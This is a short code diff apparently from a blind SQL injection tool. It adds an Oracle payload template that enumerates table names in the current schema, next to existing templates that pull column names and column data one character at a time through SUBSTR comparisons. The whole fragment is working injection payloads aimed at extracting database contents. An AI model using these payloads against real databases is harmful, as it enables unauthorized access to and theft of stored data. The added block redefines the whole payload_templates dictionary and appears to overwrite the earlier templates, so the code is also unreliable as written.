@@ -4,3 +4,6 @@ payload_templates = {
     "column_name": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM (SELECT column_name FROM all_tab_columns WHERE table_name='{table_name}' AND owner='{db_name}' AND ROWNUM <= {index}) WHERE ROWNUM = 1) > 0 THEN 'r4w8173' ELSE '' END) = 'r4w8173' AND SUBSTR((SELECT column_name FROM (SELECT column_name FROM all_tab_columns WHERE table_name='{table_name}' AND owner='{db_name}' AND ROWNUM <= {index}) WHERE ROWNUM = 1), {i}, 1) = '{char}' -- ",
     "column_data": "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM (SELECT {column_name} FROM {table_name} WHERE ROWNUM <= {index}) WHERE ROWNUM = 1) > 0 THEN 'r4w8173' ELSE '' END) = 'r4w8173' AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name} FROM {table_name} WHERE ROWNUM <= {index}) WHERE ROWNUM = 1), {i}, 1) = '{char}' -- "
 }
+payload_templates = {
+    "table_name": "1' AND SUBSTR((SELECT table_name FROM (SELECT table_name FROM all_tables WHERE owner = (SELECT sys_context('userenv','current_schema') FROM dual) AND ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' -- "
+}
